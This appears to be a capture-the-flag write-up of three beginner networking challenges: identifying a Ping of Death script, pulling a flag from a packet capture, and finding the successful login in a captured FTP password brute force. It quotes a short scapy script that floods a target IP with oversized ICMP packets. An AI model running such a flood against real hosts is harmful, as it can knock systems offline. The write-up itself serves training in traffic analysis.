# Introduction to Networking

## Long time ago

<figure><img src="../../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given a Python script embedded in a zip file.

```python
#!/usr/bin/python

from scapy.all import *

SOURCE_IP="10.0.1.1"
TARGET_IP="10.0.1.5"
MESSAGE="MOCKCTF"
NUMBER_PACKETS=1000

myname = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
send(NUMBER_PACKETS*myname)
```

Initially, I thought that this was a ping sweep or ICMP sweep or denial of service attack. However, the challenge description `long time ago` and challenge description which mentioned about `the network infrastructure was not good` and `this attack is currently unavailable` reminded me of the Ping of Death (PoD) attack.

> A Ping of Death (PoD) attack is a form of DDoS attack in which an attacker sends the recipient device simple ping requests as fragmented IP packets that are oversized or malformed. These packets do not adhere to the IP packet format when reassembled, leading to heap/memory errors and system crashes.

We can get the flag as such

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n pingofdeath | md5sum 
34ef56c8da1186efbcf3651f9bd2d114  -
```

Flag: 34ef56c8da1186efbcf3651f9bd2d114

## Packet Newbie <a href="#modal_title" id="modal_title"></a>

<figure><img src="../../../.gitbook/assets/image (77).png" alt=""><figcaption></figcaption></figure>

For this challenge, we were given a `.dump` file.

First, we could check what type of file it is.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ file beginner.dump 
beginner.dump: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

If we run the  `strings` command on it, we would find the flag near the bottom.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ strings beginner.dump 
< 8@
<,~@
< 1@
<ml@
zJ=G
0zJ=H
4mm@
zJ=H
zJ=H
GET / HTTP/1.1
Host: 192.168.81.129:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
1zJ>
1zJ>
HTTP/1.1 200 OK
Server: Werkzeug/2.2.2 Python/3.10.9
Date: Mon, 20 Feb 2023 13:51:51 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 40
Connection: close
4mo@
Flag is 52c7760924a4c4e308e103043b72f996
4mp@
4mq@
```

Flag: 52c7760924a4c4e308e103043b72f996

## FTP <a href="#modal_title" id="modal_title"></a>

<figure><img src="../../../.gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>

For this challenge, I tried a similar approach as the previous challenge.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ file ftp.dump 
ftp.dump: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
┌──(kali㉿kali)-[~/Downloads]
└─$ strings ftp.dump                
lLCg
220 (vsFTPd 3.0.3)
H!G@
220 (vsFTPd 3.0.3)
USER mock_ftp_user
331 Please specify the password.
220 (vsFTPd 3.0.3)
lLCg
PASS melissa
lLCg
USER mock_ftp_user
331 Please specify the password.
220 (vsFTPd 3.0.3)
220 (vsFTPd 3.0.3)
LCg8
PASS eminem
USER mock_ftp_user
4!H@
V!I@
331 Please specify the password.
USER mock_ftp_user
331 Please specify the password.
USER mock_ftp_user
331 Please specify the password.
PASS robert
PASS shadow
220 (vsFTPd 3.0.3)
USER mock_ftp_user
331 Please specify the password.
}0Z1
PASS forever
220 (vsFTPd 3.0.3)
USER mock_ftp_user
331 Please specify the password.
PASS jonathan
220 (vsFTPd 3.0.3)
USER mock_ftp_user
220 (vsFTPd 3.0.3)
331 Please specify the password.
USER mock_ftp_user
PASS family
331 Please specify the password.
PASS computer
PASS danielle
<WU@
4WV@
220 (vsFTPd 3.0.3)
4WW@
HWX@
USER mock_ftp_user
331 Please specify the password.
CWY@
PASS whatever
220 (vsFTPd 3.0.3)
USER mock_ftp_user
331 Please specify the password.
220 (vsFTPd 3.0.3)
4!J@
220 (vsFTPd 3.0.3)
HBh@
220 (vsFTPd 3.0.3)
USER mock_ftp_user
USER mock_ftp_user
4Bi@
VBj@
331 Please specify the password.
PASS naruto
220 (vsFTPd 3.0.3)
}0Z1
LCg8P
USER mock_ftp_user
USER mock_ftp_user
331 Please specify the password.
PASS dragon
PASS 987654321
331 Please specify the password.
PASS vanessa
220 (vsFTPd 3.0.3)
331 Please specify the password.
USER mock_ftp_user
PASS cookie
Z-nP
331 Please specify the password.
PASS sweety
220 (vsFTPd 3.0.3)
USER mock_ftp_user
331 Please specify the password.
PASS spongebob
Z-nP
220 (vsFTPd 3.0.3)
USER mock_ftp_user
Z-nQ
Z-nQ
331 Please specify the password.
-nQ4
PASS 
4Bk@
220 (vsFTPd 3.0.3)
USER mock_ftp_user
331 Please specify the password.
PASS summer
230 Login successful.
Z-nQ4
-nQ4
4WZ@
}0Z1
LCg8
4n @
4!K@
LCg8P
}0Z1
4Bl@
Z-nQ4
530 Login incorrect.
J!L@
530 Login incorrect.
530 Login incorrect.
530 Login incorrect.
530 Login incorrect.
LCg8P
530 Login incorrect.
530 Login incorrect.
c%%
530 Login incorrect.
JBm@
530 Login incorrect.
c~U
530 Login incorrect.
}0Z1
530 Login incorrect.
530 Login incorrect.
530 Login incorrect.
530 Login incorrect.
Z-nQ4
530 Login incorrect.
530 Login incorrect.
530 Login incorrect.
530 Login incorrect.

PASS summer
230 Login successful.
```

Based on static analysis above using the `strings` command, it seemed like the password was `summer`.

However, when I tried to submit the flag, it was incorrect.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n summer | md5sum                                            
6b1628b016dff46e6fa35684be6acc96  -
```

I decided to load this pcap capture file into Wireshark for further analysis.

First, I filtered by `frame contains PASS`.

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

Next, I followed the `TCP stream` and looked through a total of 19 streams.

<figure><img src="../../../.gitbook/assets/image (65).png" alt=""><figcaption></figcaption></figure>

At stream 17, we will find the password: `spongebob`.

<figure><img src="../../../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

Alternatively, an easier solution would be to apply the filter `ftp.response.code == 230` to search for the successful login on FTP server.  List of FTP return code can be found [here](https://en.wikipedia.org/wiki/List\_of\_FTP\_server\_return\_codes).

Get the MD5 of `spongebob` for the flag.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n spongebob | md5sum
e1964798cfe86e914af895f8d0291812  -
```

Flag: e1964798cfe86e914af895f8d0291812
